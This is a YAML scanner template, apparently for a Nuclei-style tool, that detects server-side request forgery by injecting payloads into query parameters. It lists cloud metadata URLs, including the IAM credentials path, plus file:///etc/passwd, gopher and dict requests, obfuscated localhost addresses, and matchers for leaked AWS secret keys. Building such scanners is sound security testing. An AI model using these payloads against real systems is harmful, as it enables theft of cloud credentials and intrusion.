id: ssrf
info:
  name: "Server-Side Request Forgery"
  severity: high
  description: "Detects SSRF by injecting internal/cloud metadata URLs and OOB callbacks"
  tags: [ssrf, injection, cloud]
  author: Wired

inject: query_params
detection: pattern

payloads:
  - "http://169.254.169.254/latest/meta-data/"
  - "http://169.254.169.254/"
  - "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  - "http://metadata.google.internal/computeMetadata/v1/"
  - "http://100.100.100.200/latest/meta-data/"
  - "http://169.254.169.254/metadata/v1/"
  - "http://127.0.0.1/"
  - "http://localhost/"
  - "http://0.0.0.0/"
  - "http://[::1]/"
  - "file:///etc/passwd"
  - "file:///etc/hosts"
  - "dict://127.0.0.1:6379/"
  - "gopher://127.0.0.1:25/"
  - "http://127.0.0.1:22"
  - "http://127.0.0.1:3306"
  - "http://2130706433/"
  - "http://017700000001/"
  - "http://0x7f000001/"

matchers:
  body_patterns:
    - "(?i)ami-id"
    - "(?i)instance-id"
    - "(?i)root:.*:0:0:"
    - "(?i)metadata\\.google\\.internal"
    - "(?i)\"computeMetadata\""
    - "(?i)iam/security-credentials"
    - "(?i)AccessKeyId"
    - "(?i)SecretAccessKey"

oob_payloads:
  - "{{OOB_URL}}"
  - "http://{{OOB_DOMAIN}}"
